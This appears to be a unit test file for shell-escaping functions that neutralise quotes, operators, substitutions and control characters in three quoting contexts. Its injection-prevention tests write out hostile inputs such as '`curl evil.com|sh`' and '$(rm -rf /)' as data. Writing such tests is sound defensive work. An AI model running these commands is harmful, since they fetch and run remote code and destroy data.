import {escapeForSingleQuotedContext, escapeForDoubleQuotedContext, escapeForUnquotedContext} from './escapeForShell'

describe('escapeForSingleQuotedContext', () => {
  describe('character escaping', () => {
    it('escapes single quotes using POSIX trick', () => {
      expect(escapeForSingleQuotedContext("it's")).toBe("it'\\''s")
    })

    it('escapes consecutive single quotes', () => {
      expect(escapeForSingleQuotedContext("''")).toBe("'\\'''\\''")
    })

    it('escapes single quotes at boundaries', () => {
      expect(escapeForSingleQuotedContext("'start")).toBe("'\\''start")
      expect(escapeForSingleQuotedContext("end'")).toBe("end'\\''")
    })

    it('handles multiple single quotes', () => {
      expect(escapeForSingleQuotedContext("'single' and 'quotes'")).toBe("'\\''single'\\'' and '\\''quotes'\\''")
    })
  })

  describe('preservation of other characters', () => {
    it('preserves double quotes', () => {
      expect(escapeForSingleQuotedContext('say "hello"')).toBe('say "hello"')
    })

    it('preserves backticks', () => {
      expect(escapeForSingleQuotedContext('run `cmd`')).toBe('run `cmd`')
    })

    it('preserves dollar signs', () => {
      expect(escapeForSingleQuotedContext('$HOME and $PATH')).toBe('$HOME and $PATH')
    })

    it('preserves shell operators', () => {
      expect(escapeForSingleQuotedContext('a&b|c;d')).toBe('a&b|c;d')
    })

    it('preserves whitespace', () => {
      expect(escapeForSingleQuotedContext('hello  \t  world')).toBe('hello  \t  world')
    })
  })

  describe('edge cases', () => {
    it('handles empty string', () => {
      expect(escapeForSingleQuotedContext('')).toBe('')
    })

    it('handles text without special characters', () => {
      expect(escapeForSingleQuotedContext('hello world')).toBe('hello world')
    })
  })
})

describe('escapeForDoubleQuotedContext', () => {
  describe('metacharacter escaping', () => {
    it('escapes double quotes', () => {
      expect(escapeForDoubleQuotedContext('say "hello"')).toBe('say \\"hello\\"')
    })

    it('escapes backticks', () => {
      expect(escapeForDoubleQuotedContext('run `whoami`')).toBe('run \\`whoami\\`')
    })

    it('escapes dollar signs', () => {
      expect(escapeForDoubleQuotedContext('path: $HOME')).toBe('path: \\$HOME')
    })

    it('escapes backslashes', () => {
      expect(escapeForDoubleQuotedContext('C:\\path')).toBe('C:\\\\path')
    })
  })

  describe('control character escaping', () => {
    it('escapes newlines', () => {
      expect(escapeForDoubleQuotedContext('line1\nline2')).toBe('line1\\nline2')
    })

    it('escapes carriage returns', () => {
      expect(escapeForDoubleQuotedContext('line1\rline2')).toBe('line1\\rline2')
    })

    it('escapes tabs', () => {
      expect(escapeForDoubleQuotedContext('col1\tcol2')).toBe('col1\\tcol2')
    })

    it('escapes mixed control characters', () => {
      expect(escapeForDoubleQuotedContext('a\nb\rc\td')).toBe('a\\nb\\rc\\td')
    })
  })

  describe('command injection prevention', () => {
    it('prevents backtick command substitution', () => {
      expect(escapeForDoubleQuotedContext('`curl evil.com|sh`')).toBe('\\`curl evil.com|sh\\`')
    })

    it('prevents nested backtick substitution', () => {
      expect(escapeForDoubleQuotedContext('`echo `whoami``')).toBe('\\`echo \\`whoami\\`\\`')
    })

    it('prevents dollar subshell execution', () => {
      expect(escapeForDoubleQuotedContext('$(rm -rf /)')).toBe('\\$(rm -rf /)')
    })

    it('prevents nested dollar subshells', () => {
      expect(escapeForDoubleQuotedContext('$(echo $(whoami))')).toBe('\\$(echo \\$(whoami))')
    })

    it('prevents variable expansion', () => {
      expect(escapeForDoubleQuotedContext('$PATH')).toBe('\\$PATH')
    })

    it('prevents brace expansion with variables', () => {
      expect(escapeForDoubleQuotedContext('${HOME}')).toBe('\\${HOME}')
    })
  })

  describe('preservation of safe characters', () => {
    it('preserves single quotes', () => {
      expect(escapeForDoubleQuotedContext("it's fine")).toBe("it's fine")
    })

    it('preserves unquoted operators (safe inside double quotes)', () => {
      expect(escapeForDoubleQuotedContext('a&b|c;d')).toBe('a&b|c;d')
    })

    it('preserves parentheses', () => {
      expect(escapeForDoubleQuotedContext('(test)')).toBe('(test)')
    })
  })

  describe('edge cases', () => {
    it('handles empty string', () => {
      expect(escapeForDoubleQuotedContext('')).toBe('')
    })

    it('handles strings with only escapable characters', () => {
      expect(escapeForDoubleQuotedContext('"`$\\')).toBe('\\"\\`\\$\\\\')
    })

    it('handles consecutive identical metacharacters', () => {
      expect(escapeForDoubleQuotedContext('$$$$')).toBe('\\$\\$\\$\\$')
      expect(escapeForDoubleQuotedContext('````')).toBe('\\`\\`\\`\\`')
    })
  })
})

describe('escapeForUnquotedContext', () => {
  describe('whitespace escaping', () => {
    it('escapes spaces', () => {
      expect(escapeForUnquotedContext('hello world')).toBe('hello\\ world')
    })

    it('escapes multiple consecutive spaces', () => {
      expect(escapeForUnquotedContext('a   b')).toBe('a\\ \\ \\ b')
    })

    it('escapes tabs', () => {
      expect(escapeForUnquotedContext('a\tb')).toBe('a\\tb')
    })

    it('escapes newlines', () => {
      expect(escapeForUnquotedContext('a\nb')).toBe('a\\nb')
    })
  })

  describe('shell operator escaping', () => {
    it('escapes pipe operator', () => {
      expect(escapeForUnquotedContext('a|b')).toBe('a\\|b')
    })

    it('escapes ampersand (background)', () => {
      expect(escapeForUnquotedContext('a&b')).toBe('a\\&b')
    })

    it('escapes semicolon (sequence)', () => {
      expect(escapeForUnquotedContext('a;b')).toBe('a\\;b')
    })

    it('escapes combined operators', () => {
      expect(escapeForUnquotedContext('a&b|c;d')).toBe('a\\&b\\|c\\;d')
    })
  })

  describe('redirection escaping', () => {
    it('escapes output redirection', () => {
      expect(escapeForUnquotedContext('cmd>file')).toBe('cmd\\>file')
    })

    it('escapes input redirection', () => {
      expect(escapeForUnquotedContext('cmd<file')).toBe('cmd\\<file')
    })

    it('escapes combined redirections', () => {
      expect(escapeForUnquotedContext('a>b<c')).toBe('a\\>b\\<c')
    })
  })

  describe('grouping and substitution escaping', () => {
    it('escapes parentheses', () => {
      expect(escapeForUnquotedContext('(test)')).toBe('\\(test\\)')
    })

    it('escapes nested parentheses', () => {
      expect(escapeForUnquotedContext('((a))')).toBe('\\(\\(a\\)\\)')
    })

    it('escapes backticks', () => {
      expect(escapeForUnquotedContext('`cmd`')).toBe('\\`cmd\\`')
    })

    it('escapes dollar signs', () => {
      expect(escapeForUnquotedContext('$VAR')).toBe('\\$VAR')
    })
  })

  describe('quote escaping', () => {
    it('escapes double quotes', () => {
      expect(escapeForUnquotedContext('"test"')).toBe('\\"test\\"')
    })

    it('escapes single quotes', () => {
      expect(escapeForUnquotedContext("'test'")).toBe("\\'test\\'")
    })

    it('escapes mixed quotes', () => {
      expect(escapeForUnquotedContext('"it\'s"')).toBe('\\"it\\\'s\\"')
    })
  })

  describe('backslash escaping', () => {
    it('escapes backslashes', () => {
      expect(escapeForUnquotedContext('a\\b')).toBe('a\\\\b')
    })

    it('escapes consecutive backslashes', () => {
      expect(escapeForUnquotedContext('a\\\\b')).toBe('a\\\\\\\\b')
    })
  })

  describe('edge cases', () => {
    it('handles empty string', () => {
      expect(escapeForUnquotedContext('')).toBe('')
    })

    it('handles string with only special characters', () => {
      const special = '|&;<>()"\'`$ \t\n'
      const result = escapeForUnquotedContext(special)
      expect(result).toMatch(/^\\/)
      expect(result).not.toBe(special)
    })

    it('handles alphanumeric strings without changes', () => {
      expect(escapeForUnquotedContext('abc123')).toBe('abc123')
    })
  })
})
